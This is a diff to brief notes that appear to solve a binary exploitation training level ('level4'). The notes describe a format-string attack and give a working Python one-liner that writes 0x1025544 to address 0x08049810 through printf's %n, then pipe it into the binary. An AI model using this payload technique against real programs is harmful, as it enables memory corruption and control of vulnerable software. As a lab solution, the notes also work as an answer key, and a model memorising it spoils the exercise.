@@ -1,1 +1,5 @@
-python -c 'print("\x08\x04\x98\x10"[::-1] +"a"*31 + " %p %p %p %p %p "*2 + "%016929984p %n")' > /tmp/test3
+binary calls to fgets and printf
+then compares 0x08049810 with 0x1025544
+with the %n we can write at that adress we just need to write 16930116 chars
+python -c 'print("\x08\x04\x98\x10"[::-1] +"a"*31 + " %p %p %p %p %p "*2 + "%016929984p %n")' > /tmp/test
+cat /tmp/test - | ./level4
